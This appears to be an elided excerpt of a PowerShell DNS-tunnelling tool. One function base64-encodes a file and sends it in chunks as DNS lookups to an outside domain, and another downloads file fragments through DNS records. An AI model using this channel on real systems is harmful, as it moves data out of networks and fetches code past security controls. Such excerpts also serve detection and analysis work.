function Upload-DNSFile{
    ...
    $keyDNSRecord = "up.start." + $openFile.SafeFileName.Replace(".","-").Replace(" ","_") + $domain
    ...
    for (($i = 0); $i -lt $base64File.length; ($i = $i + 60)){
        ...
        $DNSUploadRecord = ("up.send." + $key + "." + $count + "." + $base64File.Substring($i, $substringLength) + $domain)
    ...
    $DNSEnd = nslookup -type=CNAME ("up.end."+ $key + $domain)  2>$null | Select-String -Pattern "canonical name = (.*)" | Foreach-object {$_.Matches} | ForEach-Object {$_.Groups[1].Value}
...
function Download-DNSFile {
    ...
    $DNSApplicationNameRecord = "dn.info." + $applicationName + $domain
    ...
    for( $i = 0; $i -lt $fragmentCount; $i++ ){
        ...
        $downloadDNSRecord = "dn.get." + $applicationName + "." + $i + $domain
